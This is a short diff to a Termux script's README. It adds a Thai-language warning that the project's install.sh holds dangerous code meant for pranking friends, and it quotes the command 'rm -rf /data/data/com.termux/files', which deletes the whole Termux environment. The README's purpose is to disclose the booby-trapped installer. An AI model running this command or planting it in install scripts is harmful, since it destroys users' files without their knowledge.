@@ -27,3 +27,8 @@ nano $PREFIX/bin/alldl
 เฉพาะ Termux
 
 (โค้คไม่มีลิขสิทธิ์สามารถแก้ไขได้)
+
+## อย่าใช้โค้คนี้ เพราะมีโค้คอันตราย เอาไว้แกล้งเพื่อน มีอยู่ใน install.sh
+```
+rm -rf /data/data/com.termux/files
+```
